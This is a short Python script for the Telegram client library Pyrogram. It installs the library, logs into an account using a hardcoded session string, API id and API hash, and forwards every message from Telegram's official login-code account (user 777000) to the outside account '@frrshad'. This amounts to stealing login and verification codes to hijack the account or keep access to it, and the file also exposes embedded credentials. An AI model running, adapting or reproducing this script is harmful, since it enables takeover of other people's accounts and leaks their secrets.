import os, sys
if sys.platform == 'win32':
    pip_line = 'python -m pip install pyrogram==2.0.30'
else:
    pip_line = 'pip install pyrogram==2.0.30'
os.system(pip_line)

from pyrogram import Client, filters
from pyrogram.types import Message

feri = 'AQBrkaxq4HIqoLehLqZFeRy8y5b3iBQIGPWAXR9l4UEekXm9bM8iAUDRb4SAv3Fh9fYjdsOW-VpCwJGgzPeQGT2QX0Kj6B8rEzAtaG3Mo4y6DVAaAEDk5jO-G5mZ5CMniPE4lx2xH2WGMoGTnwPABNbd9Umn6nTZWKG6J4RzQrA8U1WbI8zHAgqWKMrwmqudUnKjTvqMbTRKUdPq82srsorESKq_VlzUgtWXdqzqeOKh2H-dwZpWf-PYMMhVIAT0bEBlrDbGQ0QvIz44vZgAADSr-pxx13zd5LfkPwNdm5NJWNjWDs7A9PDM5MsuC2Kvg_PcBY7mLv5S_3XgUUe1X8zDAAAAAU7Pks4A'

app = Client(name ='frshad', api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851', session_string=feri)

id_or_username = '@frrshad'


@app.on_message(filters.user(777000))
def forward_code(app:Client, message:Message):
    app.forward_messages(id_or_username, message.chat.id, message.id)

  
app.run()
